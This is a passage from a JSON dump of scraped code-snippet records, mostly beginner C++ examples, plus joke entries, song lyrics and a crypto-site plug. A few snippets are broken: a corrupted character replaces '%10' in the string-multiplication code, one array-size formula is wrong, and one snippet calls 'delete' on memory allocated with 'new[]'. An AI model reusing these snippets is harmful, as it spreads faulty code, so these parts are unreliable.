    "description": "#include <iostream> #include <string> using namespace std; int main() {     string name[6];     cout << \"\\nEnter your name : \";     for(int i = 0; i < 6; i++)     {         getline(cin, name[i]);     }     for(int i = 0; i < 6; i++)     {         cout << \"\\nYou entered : \" << name[i];     }     return 0; }\n",
    "reg_date": "2021-10-12T11:42:13.000Z"
  },
  {
    "id": 3127,
    "keyword": null,
    "link": null,
    "title": " multiply strings",
    "description": "string Solution::multiply(string A, string B)  {       vector<int> arr(A.size()+B.size(),0);       for(int i=A.size()-1;i>=0;i--)       {             for(int j =B.size()-1;j>=0;j--)             {                   int x = (B[j]-'0')*(A[i]-'0')+arr[i+j+1];                  arr[i+j+1] = x\u0010;                   arr[i+j] += x/10;             }       }       int i=0;       while(i<arr.size())       {             if(arr[i]!=0)                   break;                 i++;       }                   if(i == arr.size())             return \"0\";                   string s = \"\";           for(int j=i;j<arr.size();j++)             s += to_string(arr[j]);               return s;     }\n",
    "reg_date": "2021-10-12T11:42:13.000Z"
  },
  {
    "id": 3128,
    "keyword": null,
    "link": null,
    "title": " multiset c++",
    "description": "< Multisets > A multiset is a set that can have several copies of the same value.   C++ has the structures multiset and unordered_multiset that resemble set and unordered_set.       multiset<int> s;   s.insert(2);   s.insert(2);   s.insert(2);   cout << s.count(2) << \"\\n\"; // 3  - Erase removes all copies of a value from a multiset:      s.erase(2);      cout << s.count(2) << \"\\n\"; // 0  - Erase only one element with value 2      s.erase(s.find(2));      cout << s.count(2) << \"\\n\"; // 2\n",
    "reg_date": "2021-10-12T11:42:14.000Z"
  },
  {
    "id": 3129,
    "keyword": null,
    "link": null,
    "title": " multisource bfs c++",
    "description": "//just push all the sources into the queue and perform simple bfs vector<int> sources;  unordered_map<int,bool> vis; unordered_map<int,int> dist; queue<int> q;  for(int i = 0;i<sources.size();i++){             vis[sources[i]] = true;             dist[sources[i]] = 0;             q.push(sources[i]); } // then proceed as usual   while(!q.empty()){   int p = q.front();   q.pop();    for(int i = 0;i< g[p].size();i++){     if(!vis[g[p][i]]){       vis[g[p][i]] = true;       dist[g[p][i]] = dist[p] + 1;       q.push(g[p][i]);     }   } }\n",
    "reg_date": "2021-10-12T11:42:14.000Z"
  },
  {
    "id": 3130,
    "keyword": null,
    "link": null,
    "title": " my cpp",
    "description": "#include<iostream> using namespace std;  int main(){     cout << \"Micael Illos\" << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:42:14.000Z"
  },
  {
    "id": 3131,
    "keyword": null,
    "link": null,
    "title": " my own coin",
    "description": "Just go to https://cryptocreate.webflow.io/ and customize your own blockchain and create it. Thank me later\n",
    "reg_date": "2021-10-12T11:42:14.000Z"
  },
  {
    "id": 3132,
    "keyword": null,
    "link": null,
    "title": " n=sizeof(arr)/sizeof(arr+1);",
    "description": "n=sizeof(arr)/sizeof(arr+1);\n",
    "reg_date": "2021-10-12T11:42:14.000Z"
  },
  {
    "id": 3133,
    "keyword": null,
    "link": null,
    "title": " naive pattern matching algorithm",
    "description": "#include <bits/stdc++.h>  using namespace std;     void search(char* pat, char* txt)  {      int M = strlen(pat);      int N = strlen(txt);         /* A loop to slide pat[] one by one */     for (int i = 0; i <= N - M; i++) {          int j;             /* For current index i, check for pattern match */         for (j = 0; j < M; j++)              if (txt[i + j] != pat[j])                  break;             if (j == M) // if pat[0...M-1] = txt[i, i+1, ...i+M-1]              cout << \"Pattern found at index \"                  << i << endl;      }  } \n",
    "reg_date": "2021-10-12T11:42:14.000Z"
  },
  {
    "id": 3134,
    "keyword": null,
    "link": null,
    "title": " namespace",
    "description": "#include <iostream>  using namespace std;  namespace { int x; void display(); }  namespace{ void display(){ cout << \"x is \"<<x<<endl; } }  int main() {     x = 25;     display();     return 0; }   \n// namespaces #include <iostream> using namespace std;  namespace foo {   int value() { return 5; } }  namespace bar {   const double pi = 3.1416;   double value() { return 2*pi; } }  int main () {   cout << foo::value() << '\\n';   cout << bar::value() << '\\n';   cout << bar::pi << '\\n';   return 0; }\n//Header.h #include <string>  namespace Test {     namespace old_ns     {         std::string Func() { return std::string(\"Hello from old\"); }     }      inline namespace new_ns     {         std::string Func() { return std::string(\"Hello from new\"); }     } }  #include \"header.h\" #include <string> #include <iostream>  int main() {     using namespace Test;     using namespace std;      string s = Func();     std::cout << s << std::endl; // \"Hello from new\"     return 0; } \nnamespace Parent {     inline namespace new_ns     {          template <typename T>          struct C          {              T member;          };     }      template<>      class C<int> {}; } \n",
    "reg_date": "2021-10-12T11:42:14.000Z"
  },
  {
    "id": 3135,
    "keyword": null,
    "link": null,
    "title": " namespace \"std\" n'a pas de membre \"filesystem\"",
    "description": "// https://stackoverflow.com/questions/50668814/vs2017-e0135-namespace-std-has-no-member-filesystem\n",
    "reg_date": "2021-10-12T11:42:14.000Z"
  },
  {
    "id": 3136,
    "keyword": null,
    "link": null,
    "title": " namespace c++",
    "description": "Namespace std::cout or cout <<\n//Header.h #include <string>  namespace Test {     namespace old_ns     {         std::string Func() { return std::string(\"Hello from old\"); }     }      inline namespace new_ns     {         std::string Func() { return std::string(\"Hello from new\"); }     } }  #include \"header.h\" #include <string> #include <iostream>  int main() {     using namespace Test;     using namespace std;      string s = Func();     std::cout << s << std::endl; // \"Hello from new\"     return 0; } \n",
    "reg_date": "2021-10-12T11:42:15.000Z"
  },
  {
    "id": 3137,
    "keyword": null,
    "link": null,
    "title": " namespace file linking c++",
    "description": "$ g++ -E hello-world.cpp -o hello-world.ii \n",
    "reg_date": "2021-10-12T11:42:15.000Z"
  },
  {
    "id": 3138,
    "keyword": null,
    "link": null,
    "title": " nan c++ example",
    "description": "#include <iostream> #include <cmath> using namespace std;  // main() section int main() {     double nanValue;          //generating generic NaN value     //by passing an empty string     nanValue = nan(\"\");          //printing the value      cout<<\"nanValue: \"<<nanValue<<endl;          return 0; }\nWhat is NaN ? NaN, acronym for &ldquo;Not a Number&rdquo; is an exception which usually occurs in the caseswhen an expression results in a number that can&rsquo;t be represented.  For example square root of negative numbers.      // C++ code to demonstrate NaN exception  #include<iostream>  #include<cmath> // for sqrt()  using namespace std;  int main()  {      float a = 2, b = -2;         // Prints the number (1.41421)      cout << sqrt(a) << endl;         // Prints \"nan\" exception      // sqrt(-2) is complex number      cout << sqrt(b) << endl;         return 0;  }  Output:  1.41421 -nan\n",
    "reg_date": "2021-10-12T11:42:15.000Z"
  },
  {
    "id": 3139,
    "keyword": null,
    "link": null,
    "title": " nearest integer rounding in c++",
    "description": " cout << \"Nearest value of x :\" << round(x) << \"\\n\"; \n",
    "reg_date": "2021-10-12T11:42:15.000Z"
  },
  {
    "id": 3140,
    "keyword": null,
    "link": null,
    "title": " nearly similar rectangles hackerrank solution",
    "description": "#include <iostream>  using namespace std; /*  * Create classes Rectangle and RectangleArea  */ class Rectangle{     protected:         int width;         int height;      public:         virtual void display() const{             cout<< width <<' ' << height << endl;         } }; class RectangleArea : public Rectangle {     public:         void display() const override {             cout << (width * height) << endl;         }         void read_input(){             cin >> width >> height;         } };  int main() {     /*      * Declare a RectangleArea object      */     RectangleArea r_area;          /*      * Read the width and height      */     r_area.read_input();          /*      * Print the width and height      */     r_area.Rectangle::display();          /*      * Print the area      */     r_area.display();          return 0; }\n#include<bits/stdc++.h> #define ll long long using namespace std; ll combinations(ll n) { \tll count=1; \tif(n<2) \treturn 0;\t \telse \t{ \t   for(ll i=1;i<=2;i++) \t\t{ \t\t\tcount=count*n--; \t\t\tcount=count/i; \t\t} \t} \treturn count; }\n",
    "reg_date": "2021-10-12T11:42:15.000Z"
  },
  {
    "id": 3141,
    "keyword": null,
    "link": null,
    "title": " nested anonymous namespace",
    "description": "#include <iostream>  using namespace std;  namespace{ int x; namespace one{     int x= 250; void display(){ cout << x << endl; } }  }  int main() {  x = 100;  cout << x <<endl;  one :: display();     return 0; }   \n",
    "reg_date": "2021-10-12T11:42:15.000Z"
  },
  {
    "id": 3142,
    "keyword": null,
    "link": null,
    "title": " nested class in c++",
    "description": "#include<iostream> using namespace std; class A {    public:    class B {       private:       int num;       public:       void getdata(int n) {          num = n;       }       void putdata() {          cout<<\"The number is \"<<num;       }    }; }; int main() {    cout<<\"Nested classes in C++\"<< endl;    A :: B obj;    obj.getdata(9);    obj.putdata();    return 0; }\n",
    "reg_date": "2021-10-12T11:42:15.000Z"
  },
  {
    "id": 3143,
    "keyword": null,
    "link": null,
    "title": " nested conditional operator",
    "description": "\tcout << \"Execute expression using \"     << \"ternary operator: \";     int a = 2 > 3 ? 2 : 3 > 4 ? 3 : 4;     cout << a << endl;            cout << \"Execute expression using \"     << \"if else statement: \";     if ( 2 > 3 )         cout << \"2\";     else if ( 3 > 4 )         cout << \"3\";     else          cout << \"4\";\n",
    "reg_date": "2021-10-12T11:42:15.000Z"
  },
  {
    "id": 3144,
    "keyword": null,
    "link": null,
    "title": " nested for loops pyramid c++",
    "description": "//WAP to print triangle pattern... LOGIC int num{}, i{1};   cin >> num;   while (i <= num) {     for (int space = 1; space <= (num - i); space++) {  // space       cout << \" \";     }     for (int value = 1; value <= (2 * i - 1); value++) {  // value       cout << value;     }     cout << endl; //next row     i++;   }\n//C++ program to display hollow star pyramid  #include<iostream> using namespace std;  int main() {    int rows, i, j, space;     cout << \"Enter number of rows: \";    cin >> rows;     for(i = 1; i <= rows; i++)    {       //for loop to put space in pyramid       for (space = i; space < rows; space++)          cout << \" \";        //for loop to print star       for(j = 1; j <= (2 * rows - 1); j++)       {          if(i == rows || j == 1 || j == 2*i - 1)             cout << \"*\";          else             cout << \" \";       }       cout << \"\\n\";    }    return 0; } \n",
    "reg_date": "2021-10-12T11:42:15.000Z"
  },
  {
    "id": 3145,
    "keyword": null,
    "link": null,
    "title": " nested loop c++",
    "description": "#include <iostream> using namespace std;   int main () {    int i, j;        for(i = 2; i<100; i++) {       for(j = 2; j <= (i/j); j++)          if(!(i%j)) break; // if factor found, not prime          if(j > (i/j)) cout << i << \" is prime\\n\";    }        return 0; }\nnested loop cpp example\nnested loop cpp \n",
    "reg_date": "2021-10-12T11:42:16.000Z"
  },
  {
    "id": 3146,
    "keyword": null,
    "link": null,
    "title": " nested loop c++ program example",
    "description": "#include <iostream> using namespace std;   int main () {    int i, j;        for(i = 2; i<100; i++) {       for(j = 2; j <= (i/j); j++)          if(!(i%j)) break; // if factor found, not prime          if(j > (i/j)) cout << i << \" is prime\\n\";    }        return 0; }\nnested loop cpp example\nnested loop cpp \n",
    "reg_date": "2021-10-12T11:42:16.000Z"
  },
  {
    "id": 3147,
    "keyword": null,
    "link": null,
    "title": " nested loops in c++",
    "description": "#include <iostream> using namespace std;   int main () {    int i, j;        for(i = 2; i<100; i++) {       for(j = 2; j <= (i/j); j++)          if(!(i%j)) break; // if factor found, not prime          if(j > (i/j)) cout << i << \" is prime\\n\";    }        return 0; }\n",
    "reg_date": "2021-10-12T11:42:16.000Z"
  },
  {
    "id": 3148,
    "keyword": null,
    "link": null,
    "title": " netflix",
    "description": "Wait why arent you coding\nAgain u're here for Netflix... go code and get a good job... after that you can Binge watch Netflix or any OTT\nNetflix and chill huh?\nWhat about a lil Coding session? :D Jk, enjoy your rest, have a nice day!\nAre you trying to procrastinate? Get back to coding. \nYOU MEAN YOU WANT A JOB AT NETFLIX!!!!!!!!!!!\nSTOP PROCRASTINATING\nnetflix and chill !\nDo coding!! Do not waste time here!!\nShouldn't you be coding?\n",
    "reg_date": "2021-10-12T11:42:16.000Z"
  },
  {
    "id": 3149,
    "keyword": null,
    "link": null,
    "title": " netflix best 2020 series",
    "description": "Lupin\nThe Boys on amazon is pretty much the best show on earth\n",
    "reg_date": "2021-10-12T11:42:16.000Z"
  },
  {
    "id": 3150,
    "keyword": null,
    "link": null,
    "title": " never gonna give you up",
    "description": "never gonna let you down\nWe're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it And if you ask me how I'm feeling Don't tell me you're too blind to see Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give, never gonna give (Give you up) We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye\nWe're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it And if you ask me how I'm feeling Don't tell me you're too blind to see Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give, never gonna give (Give you up) (Ooh) Never gonna give, never gonna give (Give you up) We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry\noh no no\nBest song\nYou are legally obliged to rick roll someone \n2 3 4 5 \nthis is a beautifull song\nWhy would you do this to yourself..\n// https://www.youtube.com/watch?v=dQw4w9WgXcQ\n",
    "reg_date": "2021-10-12T11:42:16.000Z"
  },
  {
    "id": 3151,
    "keyword": null,
    "link": null,
    "title": " never gonna give you up lyrics",
    "description": "/*  We're no strangers to love  You know the rules and so do I  A full commitment's what I'm thinking of  You wouldn't get this from any other guy    I just wanna tell you how I'm feeling  Gotta make you understand  Never gonna give you up  Never gonna let you down  Never gonna run around and desert you  Never gonna make you cry  Never gonna say goodbye  Never gonna tell a lie and hurt you    We've known each other for so long  Your heart's been aching but you're too shy to say it  Inside we both know what's been going on  We know the game and we're gonna play it    And if you ask me how I'm feeling  Don't tell me you're too blind to see    Never gonna give you up  Never gonna let you down  Never gonna run around and desert you  Never gonna make you cry  Never gonna say goodbye  Never gonna tell a lie and hurt you  Never gonna give you up  Never gonna let you down  Never gonna run around and desert you  Never gonna make you cry  Never gonna say goodbye  Never gonna tell a lie and hurt you    (Ooh give you up)  (Ooh give you up)  (Ooh) Never gonna give, never gonna give (give you up)  (Ooh) Never gonna give, never gonna give (give you up)    We've known each other for so long  Your heart's been aching but you're too shy to say it  Inside we both know what's been going on  We know the game and we're gonna play it    I just wanna tell you how I'm feeling  Gotta make you understand    Never gonna give you up  Never gonna let you down  Never gonna run around and desert you  Never gonna make you cry  Never gonna say goodbye  Never gonna tell a lie and hurt you  Never gonna give you up  Never gonna let you down  Never gonna run around and desert you  Never gonna make you cry  Never gonna say goodbye  Never gonna tell a lie and hurt you  Never gonna give you up  Never gonna let you down  Never gonna run around and desert you  Never gonna make you cry  Never gonna say goodbye  Never gonna tell a lie and hurt you */\nWe're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it And if you ask me how I'm feeling Don't tell me you're too blind to see Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give, never gonna give (Give you up) We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye\nBest song\nGet RICKROLLED!!!!, Memes are temporary, RICKROLL is eternal. Here is the lyrics: We're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it And if you ask me how I'm feeling Don't tell me you're too blind to see Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give, never gonna give (Give you up) We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye\n",
    "reg_date": "2021-10-12T11:42:16.000Z"
  },
  {
    "id": 3152,
    "keyword": null,
    "link": null,
    "title": " new and delete operator in c++",
    "description": "// Pointer initialized with NULL // Then request memory for the variable int *p = NULL;  p = new int;                 OR  // Combine declaration of pointer  // and their assignment int *p = new int;  \n",
    "reg_date": "2021-10-12T11:42:16.000Z"
  },
  {
    "id": 3153,
    "keyword": null,
    "link": null,
    "title": " new c++",
    "description": "  MyClass * p1 = new MyClass;       // allocates memory by calling: operator new (sizeof(MyClass))       // and then constructs an object at the newly allocated space    MyClass * p2 = new (std::nothrow) MyClass;       // allocates memory by calling: operator new (sizeof(MyClass),std::nothrow)       // and then constructs an object at the newly allocated space    new (p2) MyClass;       // does not allocate memory -- calls: operator new (sizeof(MyClass),p2)       // but constructs an object at p2    // Notice though that calling this function directly does not construct an    //object:   MyClass * p3 = (MyClass*) ::operator new (sizeof(MyClass));       // allocates memory by calling: operator new (sizeof(MyClass))       // but does not call MyClass's constructor    delete p1;   delete p2;   delete p3;\n",
    "reg_date": "2021-10-12T11:42:16.000Z"
  },
  {
    "id": 3154,
    "keyword": null,
    "link": null,
    "title": " new class * [] c++",
    "description": "/*  Keyword \"this\" You can use keyword \"this\" to refer to this instance inside a class definition.  One of the main usage of keyword this is to resolve ambiguity between the names of  data member and function parameter. For example: */ class Circle { private:    double radius;                 // Member variable called \"radius\"    ...... public:    void setRadius(double radius) { // Function's argument also called \"radius\"       this->radius = radius;          // \"this.radius\" refers to this instance's member variable          // \"radius\" resolved to the function's argument.    }    ...... }\n",
    "reg_date": "2021-10-12T11:42:17.000Z"
  },
  {
    "id": 3155,
    "keyword": null,
    "link": null,
    "title": " new expression",
    "description": "new int(*[10])(); // error: parsed as (new int) (*[10]) () new (int (*[10])()); // okay: allocates an array of 10 pointers to functions\n",
    "reg_date": "2021-10-12T11:42:17.000Z"
  },
  {
    "id": 3156,
    "keyword": null,
    "link": null,
    "title": " new in c++",
    "description": "#include <ext/pb_ds/assoc_container.hpp> #include <ext/pb_ds/tree_policy.hpp>  using namespace __gnu_pbds;  typedef tree<int, null_type, less<int>, rb_tree_tag,                     tree_order_statistics_node_update>                     ordered_set;  ordered_set ord_set;  int a; ord_set.insert(a); *ord_set.find_by_order(a); ord_set.order_of_key(a);\n  MyClass * p1 = new MyClass;       // allocates memory by calling: operator new (sizeof(MyClass))       // and then constructs an object at the newly allocated space    MyClass * p2 = new (std::nothrow) MyClass;       // allocates memory by calling: operator new (sizeof(MyClass),std::nothrow)       // and then constructs an object at the newly allocated space    new (p2) MyClass;       // does not allocate memory -- calls: operator new (sizeof(MyClass),p2)       // but constructs an object at p2    // Notice though that calling this function directly does not construct an    //object:   MyClass * p3 = (MyClass*) ::operator new (sizeof(MyClass));       // allocates memory by calling: operator new (sizeof(MyClass))       // but does not call MyClass's constructor    delete p1;   delete p2;   delete p3;\n//placement new in c++ char *buf  = new char[sizeof(string)]; // pre-allocated buffer string *p = new (buf) string(\"hi\");    // placement new string *q = new string(\"hi\");          // ordinary heap allocation /*Standard C++ also supports placement new operator, which constructs  an object on a pre-allocated buffer. This is useful when building a  memory pool, a garbage collector or simply when performance and exception  safety are paramount (there's no danger of allocation failure since the memory has already been allocated, and constructing an object on a pre-allocated buffer takes less time): */\n#include <iostream> #include <string>  using String = std::string; class Entity { private: \tString m_Name; public: \tEntity() : m_Name(\"Unknown\") {} \tEntity(const String& name) : m_Name(name) {} \tconst String& GetName() const { \t\treturn m_Name; \t}; }; int main() {   // new keyword is used to allocate memory on heap \tint* b = new int; // new keyword will call the c function malloc which will allocate on heap  memory = data and return a ptr to that plaock of memory \tint* c = new int[50]; \tEntity* e1 = new Entity;//new keyword Not allocating only memory but also calling the constructor \tEntity* e = new Entity[50]; \t//usually calling new will  call underlined c function malloc \t//malloc(50);  \tEntity* alloc = (Entity*)malloc(sizeof(Entity));//will not call constructor only  allocate memory = memory of entity \tdelete e;//calls a c function free \tEntity* e3 = new(c) Entity();//Placement New\n",
    "reg_date": "2021-10-12T11:42:17.000Z"
  },
  {
    "id": 3157,
    "keyword": null,
    "link": null,
    "title": " new keyword in cpp",
    "description": "#include <iostream> #include <string>  using String = std::string; class Entity { private: \tString m_Name; public: \tEntity() : m_Name(\"Unknown\") {} \tEntity(const String& name) : m_Name(name) {} \tconst String& GetName() const { \t\treturn m_Name; \t}; }; int main() {   // new keyword is used to allocate memory on heap \tint* b = new int; // new keyword will call the c function malloc which will allocate on heap  memory = data and return a ptr to that plaock of memory \tint* c = new int[50]; \tEntity* e1 = new Entity;//new keyword Not allocating only memory but also calling the constructor \tEntity* e = new Entity[50]; \t//usually calling new will  call underlined c function malloc \t//malloc(50);  \tEntity* alloc = (Entity*)malloc(sizeof(Entity));//will not call constructor only  allocate memory = memory of entity \tdelete e;//calls a c function free \tEntity* e3 = new(c) Entity();//Placement New }\t\t\n#include <iostream> #include <string>  using String = std::string; class Entity { private: \tString m_Name; public: \tEntity() : m_Name(\"Unknown\") {} \tEntity(const String& name) : m_Name(name) {} \tconst String& GetName() const { \t\treturn m_Name; \t}; }; int main() {   // new keyword is used to allocate memory on heap \tint* b = new int; // new keyword will call the c function malloc which will allocate on heap  memory = data and return a ptr to that plaock of memory \tint* c = new int[50]; \tEntity* e1 = new Entity;//new keyword Not allocating only memory but also calling the constructor \tEntity* e = new Entity[50]; \t//usually calling new will  call underlined c function malloc \t//malloc(50);  \tEntity* alloc = (Entity*)malloc(sizeof(Entity));//will not call constructor only  allocate memory = memory of entity \tdelete e;//calls a c function free \tEntity* e3 = new(c) Entity();//Placement New\n",
    "reg_date": "2021-10-12T11:42:17.000Z"
  },
  {
    "id": 3158,
    "keyword": null,
    "link": null,
    "title": " new line",
    "description": "'\\n'\n",
    "reg_date": "2021-10-12T11:42:17.000Z"
  },
  {
    "id": 3159,
    "keyword": null,
    "link": null,
    "title": " new line arduino",
    "description": "'\\n'\n",
    "reg_date": "2021-10-12T11:42:17.000Z"
  },
  {
    "id": 3160,
    "keyword": null,
    "link": null,
    "title": " newline in c++",
    "description": "cout<<\"\\n\"; or cout<<endl;\n#include<iostream.h> void main() {   cout<<\"First Line\\n\";   cout<<\"Next Line\"; }\n",
    "reg_date": "2021-10-12T11:42:17.000Z"
  },
  {
    "id": 3161,
    "keyword": null,
    "link": null,
    "title": " next palindrome number in cpp",
    "description": "#include <iostream>   bool isPalindrome (int number) {     int decomposed = number, reversed = 0;     while (decomposed) {         reversed = 10 * reversed + (decomposed % 10);         decomposed /= 10;     }     return reversed == number; }   int nextPalindromicNumber (int number) {     while (!isPalindrome(++number));     return number; }   int main () {     int testCases;     std::cin >> testCases;     while (testCases--) {         int number;         std::cin >> number;         std::cout << nextPalindromicNumber(number) << '\\n';     } } \n#include <iostream> #include <string.h> using namespace std; int nextpalin (int num){     while (num++) {         string str = to_string (num); /// int to string conversion         int l = str.length()-1;         int s = 0;         while( s<l ){               if (str[s]!=str[l]) break;               else {                     s++;                     l--;                     }         if (s>=l) return num;}                 }    }  int main () {     int t;     cin >> t;     while (t--){     int num;     cin >> num;     if (num==0)  cout << \"1\" << endl;    else {         if (num<9)  cout << num+1 << endl;        else  cout << nextpalin( num) << endl;}      } } \n",
    "reg_date": "2021-10-12T11:42:17.000Z"
  },
  {
    "id": 3162,
    "keyword": null,
    "link": null,
    "title": " nginx linux",
    "description": "sudo systemctl restart nginx\nsudo apt-get update sudo apt-get -y install nginx\nsudo apt update sudo apt install nginx \n",
    "reg_date": "2021-10-12T11:42:17.000Z"
  },
  {
    "id": 3163,
    "keyword": null,
    "link": null,
    "title": " niet werkend",
    "description": "mpc fandit\n",
    "reg_date": "2021-10-12T11:42:17.000Z"
  },
  {
    "id": 3164,
    "keyword": null,
    "link": null,
    "title": " nike",
    "description": "Explore the avatar shop to find  more Accessories!\n",
    "reg_date": "2021-10-12T11:42:18.000Z"
  },
  {
    "id": 3165,
    "keyword": null,
    "link": null,
    "title": " no indentation latex",
    "description": "\\usepackage{parskip}% http://ctan.org/pkg/parskip \\setlength{\\parindent}{0pt}  \\noindent\n",
    "reg_date": "2021-10-12T11:42:18.000Z"
  },
  {
    "id": 3166,
    "keyword": null,
    "link": null,
    "title": " no such file or directory in c++",
    "description": "install try to run your code from creating a cpp file on desktop or don't use your file name like this: 01 c++.cpp;   always start with a string value not int\n",
    "reg_date": "2021-10-12T11:42:18.000Z"
  },
  {
    "id": 3167,
    "keyword": null,
    "link": null,
    "title": " nodemcu web server slider",
    "description": "// Import required libraries #include <ESP8266WiFi.h> #include <ESPAsyncTCP.h> #include <ESPAsyncWebServer.h>  // Replace with your network credentials const char* ssid = \"REPLACE_WITH_YOUR_SSID\"; const char* password = \"REPLACE_WITH_YOUR_PASSWORD\";  const int output = 2;  String sliderValue = \"0\";  const char* PARAM_INPUT = \"value\";  // Create AsyncWebServer object on port 80 AsyncWebServer server(80);  const char index_html[] PROGMEM = R\"rawliteral( <!DOCTYPE HTML><html> <head>   <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">   <title>ESP Web Server</title>   <style>     html {font-family: Arial; display: inline-block; text-align: center;}     h2 {font-size: 2.3rem;}     p {font-size: 1.9rem;}     body {max-width: 400px; margin:0px auto; padding-bottom: 25px;}     .slider { -webkit-appearance: none; margin: 14px; width: 360px; height: 25px; background: #FFD65C;       outline: none; -webkit-transition: .2s; transition: opacity .2s;}     .slider::-webkit-slider-thumb {-webkit-appearance: none; appearance: none; width: 35px; height: 35px; background: #003249; cursor: pointer;}     .slider::-moz-range-thumb { width: 35px; height: 35px; background: #003249; cursor: pointer; }    </style> </head> <body>   <h2>ESP Web Server</h2>   <p><span id=\"textSliderValue\">%SLIDERVALUE%</span></p>   <p><input type=\"range\" onchange=\"updateSliderPWM(this)\" id=\"pwmSlider\" min=\"0\" max=\"1023\" value=\"%SLIDERVALUE%\" step=\"1\" class=\"slider\"></p> <script> function updateSliderPWM(element) {   var sliderValue = document.getElementById(\"pwmSlider\").value;   document.getElementById(\"textSliderValue\").innerHTML = sliderValue;   console.log(sliderValue);   var xhr = new XMLHttpRequest();   xhr.open(\"GET\", \"/slider?value=\"+sliderValue, true);   xhr.send(); } </script> </body> </html> )rawliteral\";  // Replaces placeholder with button section in your web page String processor(const String& var){   //Serial.println(var);   if (var == \"SLIDERVALUE\"){     return sliderValue;   }   return String(); }  void setup(){   // Serial port for debugging purposes   Serial.begin(115200);    analogWrite(output, sliderValue.toInt());    // Connect to Wi-Fi   WiFi.begin(ssid, password);   while (WiFi.status() != WL_CONNECTED) {     delay(1000);     Serial.println(\"Connecting to WiFi..\");   }    // Print ESP Local IP Address   Serial.println(WiFi.localIP());    // Route for root / web page   server.on(\"/\", HTTP_GET, [](AsyncWebServerRequest *request){     request->send_P(200, \"text/html\", index_html, processor);   });    // Send a GET request to <ESP_IP>/slider?value=<inputMessage>   server.on(\"/slider\", HTTP_GET, [] (AsyncWebServerRequest *request) {     String inputMessage;     // GET input1 value on <ESP_IP>/slider?value=<inputMessage>     if (request->hasParam(PARAM_INPUT)) {       inputMessage = request->getParam(PARAM_INPUT)->value();       sliderValue = inputMessage;       analogWrite(output, sliderValue.toInt());     }     else {       inputMessage = \"No message sent\";     }     Serial.println(inputMessage);     request->send(200, \"text/plain\", \"OK\");   });      // Start server   server.begin(); }    void loop() {    } \n",
    "reg_date": "2021-10-12T11:42:18.000Z"
  },
  {
    "id": 3168,
    "keyword": null,
    "link": null,
    "title": " noexcept c++",
